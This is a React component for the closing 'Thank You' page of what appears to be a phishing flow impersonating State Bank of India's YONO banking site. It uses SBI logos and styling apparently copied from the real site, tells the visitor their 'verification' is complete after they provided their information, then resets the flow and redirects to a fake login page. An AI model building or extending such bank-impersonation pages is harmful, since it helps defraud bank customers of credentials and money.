import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { resetFlow } from '@/lib/userState';

export default function CompletionPage() {
  const [, navigate] = useLocation();
  const [countdown, setCountdown] = useState(5);
  
  useEffect(() => {
    // Countdown to redirect to login page
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          // Reset the flow data and redirect to login
          resetFlow();
          setTimeout(() => navigate('/'), 0);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);
  
  return (
    <div id="__next">
      <header className="Jeuookhh_logo__chFnY">
        <img 
          alt="SBI Logo" 
          loading="lazy" 
          width="120" 
          height="32" 
          decoding="async"
          data-nimg="1" 
          src="/images/yono.png" 
          style={{ color: "transparent" }} 
        />
      </header>
      <main>
        <div className="Jeuookhh_login_heading__g_rIN">
          <h3 className="Jeuookhh_login_heading_h3__40cUi">Thank You</h3>
        </div>
        <div className="Jeuookhh_login_form__UT1PX">
          <div className="Jeuookhh_info_panel__n1fy6" style={{ backgroundColor: '#e7f4e4', border: '1px solid #6ab04c' }}>
            <div className="Jeuookhh_notify_icon__8mrta">
              <p style={{ color: '#2d6a4f', fontSize: '18px', textAlign: 'center', fontWeight: 'bold', marginBottom: '20px' }}>
                Your verification has been completed successfully!
              </p>
              <p style={{ textAlign: 'center' }}>
                Thank you for providing your information. Your account verification is now complete.
              </p>
              <p style={{ textAlign: 'center', marginTop: '20px' }}>
                Redirecting to login page in {countdown} seconds...
              </p>
            </div>
          </div>
        </div>
      </main>
      <div className="Jeuookhh_footer_area__5ot65">
        <img 
          alt="SBI Security" 
          loading="lazy" 
          width="68" 
          height="28" 
          decoding="async" 
          data-nimg="1" 
          src="/images/gwhp.png" 
          style={{ color: "transparent" }} 
        />
      </div>
      <div className="Jeuookhh_footer__Wxn0J">
        <p>©</p>
      </div>
    </div>
  );
}